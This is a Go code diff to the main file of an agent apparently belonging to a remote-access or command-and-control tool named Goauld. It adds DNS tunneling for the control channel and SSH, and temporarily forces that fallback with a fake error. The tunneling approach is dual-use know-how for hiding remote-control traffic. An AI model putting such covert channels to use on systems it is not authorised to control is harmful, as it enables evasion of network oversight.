@@ -3,6 +3,7 @@ package main
 import (
 	"Goauld/agent/keepawake/keepawake"
 	"Goauld/agent/proxy"
+	"Goauld/agent/ssh/transport"
 	"Goauld/common"
 	"Goauld/common/utils"
 	"context"
@@ -98,6 +99,7 @@ func main() {
 
 func run() utils.CancelReason {
 
+	var dnsTransport *transport.DNSSH
 	cancelReason := make(chan utils.CancelReason)
 	controlErr := make(chan error)
 	sshdErr := make(chan error)
@@ -112,20 +114,36 @@ func run() utils.CancelReason {
 	log.Info().Msg("Agent init done")
 
 	ctx, cancel := context.WithCancel(context.Background())
-	globalCanceler := utils.GlobalCanceler{
+	globalCanceler := &utils.GlobalCanceler{
 		Cancel:       cancel,
 		CancelReason: cancelReason,
 	}
 	defer cancel()
 
 	// Initialize the control socket.io
-	controlPlanClient := control.NewControlPlanClient(ctx, configDone, globalCanceler)
-	err := controlPlanClient.Init()
+	// controlPlanClient := control.NewControlPlanClient(ctx, configDone, globalCanceler)
+	// err := controlPlanClient.Init()
+	err := fmt.Errorf("")
+	var controlPlanClient *control.ControlPlanClient
 	if err != nil {
 		log.Error().Err(err).Msg("error initializing the control plan")
-		return utils.Exit
+		log.Info().Err(err).Msg("trying to start the control plan in DNS mode")
+
+		dnsTransport, err = transport.NewDNSSH()
+		if err != nil {
+			log.Error().Err(err).Msg("error initializing the DNS transport")
+			return utils.Exit
+		}
+		defer dnsTransport.Close()
+		controlPlanClient = control.NewControlPlanClient(ctx, configDone, globalCanceler)
+		err = controlPlanClient.InitOverDns(dnsTransport.ControlStream)
+		if err != nil {
+			log.Error().Err(err).Msg("error initializing the control plan over DNS")
+			return utils.Exit
+		}
 	}
-	HandleCtrlC(controlPlanClient, globalCanceler)
+	cancelCtrlC := HandleCtrlC(controlPlanClient, globalCanceler)
+	defer cancelCtrlC()
 
 	// Create the client SSH
 	sshAgent := ssh.NewSSHAgent()
@@ -144,7 +162,7 @@ func run() utils.CancelReason {
 		// Waiting for the configuration to be completed
 		<-configDone
 		// Initialize the client SSH
-		err = sshAgent.Init(ctx)
+		err = sshAgent.Init(ctx, dnsTransport)
 		if err != nil {
 			log.Error().Err(err).Msg("error initializing the SSH")
 			return
@@ -334,13 +352,18 @@ func run() utils.CancelReason {
 	case <-ctx.Done():
 		log.Error().Err(ctx.Err())
 	}
-	return <-cancelReason
+	reason := <-cancelReason
+	fmt.Println(reason)
+	fmt.Println(reason)
+	fmt.Println(reason)
+	fmt.Println(reason)
+	return reason
 }
 
 // HandleCtrlC intercepts the ctrl-c events.
 // It signals to close all running goroutine, and wait one second to allow the agent to signal the disconnection
 // to the server, then it exits.
-func HandleCtrlC(controlPlanClient *control.ControlPlanClient, canceler utils.GlobalCanceler) {
+func HandleCtrlC(controlPlanClient *control.ControlPlanClient, canceler *utils.GlobalCanceler) func() {
 	c := make(chan os.Signal, 1)
 	signal.Notify(c, os.Interrupt)
 	go func() {
@@ -351,4 +374,7 @@ func HandleCtrlC(controlPlanClient *control.ControlPlanClient, canceler utils.Gl
 			controlPlanClient.Close()
 		}
 	}()
+	return func() {
+		signal.Stop(c)
+	}
 }
